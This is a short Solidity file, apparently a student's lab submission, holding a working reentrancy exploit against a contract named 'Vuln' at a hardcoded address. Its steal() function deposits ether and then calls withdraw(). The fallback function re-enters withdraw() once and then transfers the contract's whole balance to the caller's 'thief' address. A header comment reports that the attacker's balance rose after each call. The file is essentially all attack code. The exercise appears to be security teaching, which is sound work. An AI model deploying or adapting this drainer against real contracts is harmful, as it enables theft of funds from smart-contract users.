// kone9079
// transactions were not showing up on etherscan but the ether in my account increased the appropriate amount after each call of steal...

pragma solidity ^0.5.0;

contract Vuln { // defines Vuln contract to allow use of function calls below
    
    function deposit() public payable;
    function withdraw() public;
    
}



contract attack {
    
    
    address vuln_add = address(0xFB81aDf526904E3E71ca7C0d2dc841a94B1E203C);
    
    
    
    Vuln vuln_interface = Vuln(vuln_add);
    int tmp = 0; // tracks if recursive call has been made or not
    address payable thief;
    
    function steal() public payable {
        
        thief = msg.sender;
        
        vuln_interface.deposit.value(msg.value)(); // deposits ether into vuln contract
        vuln_interface.withdraw(); // requests to withdraw ether from vuln contract
    }
    
    
    
    function () external payable {
        
        if(tmp == 0)
        {
            tmp += 1;
            vuln_interface.withdraw(); // makes recursive call if it hasen't been made yet
        }
        
        else {
            thief.transfer(address(this).balance); // transfers ether to thief's wallet if recursive call was already made
            tmp = 0;
        }
    }
}
